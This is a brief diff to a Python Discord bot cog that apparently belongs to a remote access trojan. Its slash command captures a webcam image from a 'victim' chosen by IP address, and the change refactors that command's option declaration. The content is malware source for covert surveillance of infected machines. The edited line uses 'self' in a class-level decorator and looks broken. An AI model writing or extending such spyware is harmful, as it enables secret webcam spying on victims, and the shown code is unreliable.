@@ -13,9 +13,7 @@ class GetWebcam(commands.Cog):
         
     @commands.slash_command(
         description="Capture image from webcam",
-        options=[
-            discord.Option("victim", description="IP Address of specific victim", required=True),
-        ],
+        options=[self.bot.victim],
     )
     async def get_webcam(self, ctx, victim):
         if str(victim) == str(self.ip_addr):
